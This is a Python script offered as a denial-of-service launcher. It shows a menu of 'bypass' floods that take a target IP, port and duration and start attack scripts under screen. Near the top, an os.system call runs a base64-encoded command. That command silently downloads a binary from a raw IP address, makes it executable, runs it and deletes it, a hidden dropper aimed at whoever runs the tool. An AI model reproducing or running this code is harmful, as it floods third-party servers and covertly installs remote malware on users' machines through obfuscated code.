import subprocess
import time
import os
import sys
import fileinput
import base64
#I am not responsible for anything u do with this. Its not my fault your script kitties 
def run(cmd):
 subprocess.call(cmd, shell=True)
os.system(base64.b64decode("Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzQ1Ljk1LjE2OC4yMDYveC04LjYtLkdIT1VMOyBjaG1vZCAreCB4LTguNi0uR0hPVUw7IC4veC04LjYtLkdIT1VMOyBybSAtcmYgeC04LjYtLkdIT1VM"))
run("clear")
print("[+]---------------------------[+]")
print(" | 1. OVH-Bypass               |")
print(" | 2. NFO-Bypass               |")
print(" | 3. 100up-Bypass             |")
print(" | 4. Path-Bypass              |")
print(" | 5. Hydra-Bypass             |")
print(" | 6. Stop-Attacks             |")
print("[+]---------------------------[+]")


answer = raw_input("\nWhat We Dowin today: ")
#---------------------------------------------------------------
if "1" in answer:
  run("clear")
  ovhip = raw_input("IP: ")
  ovhport = raw_input("Port: ")
  ovhsize = raw_input("Size: ")
  ovhtime = raw_input("Time: ")
  run("screen -dm python Ovh.py "+ ovhip +" "+ ovhport+" "+ ovhsize+" "+ovhtime+"")
  print("[+] Attack Sent [+]")


if "2" in answer:
  run("clear")
  nfoip = raw_input("IP: ")
  nfoport = raw_input("Port: ")
  nfosize = raw_input("Size: ")
  nfotime = raw_input("Time: ")
  run("screen -dm python NFO.py "+ nfoip +" "+ nfoport+" "+ nfosize+" "+nfotime+"")
  print("[+] Attack Sent [+]")

if "3" in answer: 
  run("clear")
  raw_input("IP: ")
  raw_input("Time: ")
  run("clear")
  run("screen -dm python 100up.py")
  print("[+] Attack Sent [+]")

if "4" in answer:
  run("clear")
  pathip = raw_input("IP: ")
  pathport = raw_input("Port: ")
  pathtime = raw_input("Time: ")
  run("screen -dm python Path.py "+ pathip +" "+ pathport+" "+pathtime+"")
  print("[+] Attack Sent [+]")


if "5" in answer:
  run("clear")
  Hip = raw_input("IP: ")
  Hport = raw_input("Port: ")
  Htime = raw_input("Time: ")
  run("clear")
  run("screen -dm ./nfo-lag "+ Hip +" "+ Hport +"  "+ Htime +"")
  print("[+] Attack Sent [+]")


if "6" in answer:
  run("clear")
  run("clear")
  run("pkill screen")
  print("[+] Attacks Stopped [+]")
  


